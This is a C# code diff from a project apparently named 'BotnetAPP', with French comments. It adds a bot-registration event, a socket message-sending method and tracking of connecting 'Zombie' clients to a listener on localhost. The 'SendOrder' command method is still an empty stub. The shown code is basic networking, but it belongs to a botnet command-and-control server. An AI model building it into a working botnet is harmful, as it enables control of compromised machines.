@@ -26,7 +26,7 @@ namespace BotnetAPP.Network {
         private Dictionary<Zombie, Socket> _connectedBot ; 
         // Event
 
-        public event EventConnectionHandler OnNewConnectedBot;
+        public event EventConnectionHandler NewConnectedBot;
 
 
         // Thread
@@ -54,6 +54,11 @@ namespace BotnetAPP.Network {
 
     }
 
+
+    public void OnNewConnectedBot() {
+        NewConnectedBot?.Invoke(this);
+    }
+
     /*
 
     Ecriture et lecture des messages  envoyés et reçu par l'un des clients
@@ -70,8 +75,10 @@ namespace BotnetAPP.Network {
                 return resultat ; 
         }
     
-    private void WriteNetMessage (Socket s) {
+    private void WriteNetMessage (string message, Socket s) {
         // A écrire pour simplifier le processus de communication
+
+        s.Send(_asen.GetBytes(message)) ;
     }
 
     
@@ -115,6 +122,8 @@ namespace BotnetAPP.Network {
     public void SendOrder() {
         
     }
+
+
     public void ListenConnectionRequest() {
         
                 IPAddress ipAd = IPAddress.Parse("127.0.0.1");
@@ -143,7 +152,9 @@ namespace BotnetAPP.Network {
                     Plus tard je mettrais un vrai système de contrôle de connexion
                     */ 
                     if ( GetIncomingMessage(s) == "1" ) {
-                        _connectedBot.Add(new Zombie(), s) ;
+                        Zombie nvZb = new(s.RemoteEndPoint.ToString()) ; 
+                        _connectedBot.Add(nvZb, s) ;
+                        OnNewConnectedBot() ; 
                     }
 
 
